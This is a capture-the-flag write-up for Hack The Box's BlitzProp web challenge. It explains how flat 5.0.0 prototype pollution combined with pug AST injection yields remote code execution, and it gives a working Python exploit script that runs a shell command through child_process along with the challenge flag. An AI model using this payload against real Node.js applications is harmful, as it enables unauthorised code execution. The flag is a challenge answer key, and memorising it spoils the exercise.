---
slug: blitzprop-cyberapocalypse-2021-ctf
title: BlitzProp - Cyberapocalypse 2021 CTF
description: This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.
authors: kiroki
tags: [Cyber Security, CTF]
---

This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.

### Prompt

A tribute page for the legendary alien band called BlitzProp!

<!-- truncate -->

### Recon

We're provided with the source code for a cute webpage, which allows us to vote for some song names using an input field.

By looking at the song names we're supposed to vote for, we could potentially notice some hints like **Polluting** and **AST**.

The site seems to be running on a `node` environment with an `express` server, so we can check out the routes handling file.

```js
const path              = require('path');
const express           = require('express');
const pug               = require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { song } = unflatten(req.body);

		console.log(req.body)
		console.log(unflatten(req.body))

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});

module.exports = router;
```

Looking closely, we see that the `/api/submit` POST endpoint uses a module called `flat` to unflatten a request body into json. The code also uses `pug` for templating.

We can check the versions of these libraries in the `package.json` file.

```json
"dependencies": {
    "express": "^4.17.1",
    "flat": "5.0.0",
    "pug": "^3.0.0"
}
```

The version of flat used seems to be vulnerable to prototype pollution, and we can find information on the payloads we can use [here](https://blog.p6.is/AST-Injection/#Example-1), finding an example exploiting `pug`.

### Solution

By having the exploit at hand, we can write a simple script which will send a POST request with the required `song.name` in the data, as well as with our payload.

The payload itself will allow us to do _Remote Code Execution_. More to the point, we will cat the flag file into the publically available `/static/js` folder, so we can navigate to it after the pollution exploit.

```python
import requests

TARGET_URL = 'http://46.101.44.190:32262'

# make pollution
r=requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"The Goose went wild",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('cat flag* > static/js/main.js')"
    }
})
# execute
requests.get(TARGET_URL)
print(r.text)
```

Now that we have executed our command, we simply go ahead and curl that flag file, and find our flag

```
CHTB{p0llute_with_styl3}
```

import DonateCard from '@site/src/components/DonateCard';

<DonateCard/>